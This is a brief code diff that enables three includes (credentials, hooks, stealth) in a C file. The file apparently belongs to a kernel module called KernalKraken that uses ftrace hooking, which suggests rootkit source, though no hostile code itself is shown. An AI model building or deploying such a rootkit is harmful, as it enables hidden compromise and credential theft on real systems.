@@ -1,9 +1,9 @@
 #include "headers/KernalKraken.h"
 #include "headers/ftrace_helper.h"
 
-//#include "src/credentials.c"
-//#include "src/hooks.c"
-//#include "src/stealth.c"
+#include "src/credentials.c"
+#include "src/hooks.c"
+#include "src/stealth.c"
 
 static int setup(void) {
     int error;
